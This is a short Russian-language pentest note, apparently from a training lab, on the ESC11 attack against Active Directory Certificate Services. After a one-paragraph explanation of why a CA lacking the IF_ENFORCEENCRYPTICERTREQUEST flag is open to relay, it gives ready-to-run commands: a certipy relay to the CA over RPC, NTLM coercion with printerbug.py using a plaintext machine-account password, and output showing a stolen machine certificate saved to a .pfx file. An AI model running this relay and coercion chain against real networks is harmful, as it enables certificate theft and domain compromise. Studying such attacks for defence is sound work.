#rpc #protocol #relay #mitm #ad #hacking #ntlm #esc11

Флаг `IF_ENFORCEENCRYPTICERTREQUEST` обеспечивает шифрование запросов на регистрацию сертификатов между клиентом и `CA`; клиент должен шифровать все запросы на регистрацию сертификатов, которые он отправляет на `CA`. Таким образом, если в `CA` не установлен флаг `IF_ENFORCEENCRYPTICERTREQUEST`, для регистрации сертификатов можно использовать незашифрованные сеансы (например, принудительную `SMB NTLM` аутентификацию через ретрансляцию по протоколу `HTTP`
# ESC11

1) Передаем аутентификацию через rpc и указываем имя CA
```bash
certipy relay -target "rpc://172.16.117.3" -ca "INLANEFREIGHT-DC01-CA"
```

2) Принуждаем к аутентификации
```bash
python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30
```

3) Получаем сертификат .pfx и далее доступ к службе 
```bash
[*] Successfully requested certificate 
[*] Request ID is 14 
[*] Got certificate with DNS Host Name 'WS01.INLANEFREIGHT.LOCAL' 
[*] Certificate has no object SID 
[*] Saved certificate and private key to 'ws01.pfx'
```